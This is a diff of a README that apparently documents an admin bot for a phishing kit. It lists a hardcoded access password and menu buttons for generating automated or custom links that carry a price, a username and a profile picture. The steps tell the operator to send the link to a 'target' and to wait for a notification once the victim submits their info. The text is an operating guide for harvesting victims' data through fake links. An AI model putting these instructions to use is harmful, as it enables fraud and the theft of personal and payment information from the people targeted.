@@ -27,6 +27,9 @@
 
 1. Go to the Admin Bot and send `/start`.
 2. Send the password: `samiristhegoat`.
-3. Use `/generate_auto [price]` or `/generate_custom [price] [username] [pfp_url]`.
+3. Use the menu buttons:
+   - **🚀 Generate Link**: Create a new link. Choose between Automated or Custom.
+   - **📊 View Links**: See your recently created links.
+   - **⚙️ Settings**: Check your configuration.
 4. Copy the generated link and send it to your target.
 5. When they click it and submit their info, you will get a notification in the Admin Bot.
